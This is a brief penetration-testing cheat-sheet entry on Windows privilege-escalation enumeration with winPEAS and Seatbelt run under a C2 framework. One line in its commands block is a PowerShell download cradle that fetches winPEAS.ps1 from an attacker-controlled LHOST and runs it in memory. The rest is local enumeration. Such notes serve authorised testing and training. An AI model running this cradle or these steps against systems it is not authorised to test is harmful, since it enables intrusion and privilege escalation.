# 11.01 Enumeration winPEAS Seatbelt

> Run `winPEAS` for color-coded services/ACLs/creds/tasks, or `Seatbelt` via `execute-assembly` under a C2.

## Overview

winPEAS prints color-coded findings — services, ACLs, registry creds, scheduled tasks. Seatbelt is the .NET version, runs via execute-assembly under C2.

## Steps

- **Drop winPEASany.exe** (or .ps1).
- **Run quiet, full**.
- **Triage red/yellow** — those are usually the privesc paths.
- **Cross-check manually** — accesschk.exe, whoami /priv.

## Commands

### Quick enum

```powershell
iex(new-object net.webclient).downloadstring('http://<LHOST>/winPEAS.ps1'); Invoke-Privesccheck
.\\winPEASany.exe quiet systeminfo userinfo processinfo
whoami /all
Get-Service | ? { $_.Status -eq 'Running' }
Get-ScheduledTask | ? { $_.State -eq 'Ready' }
```
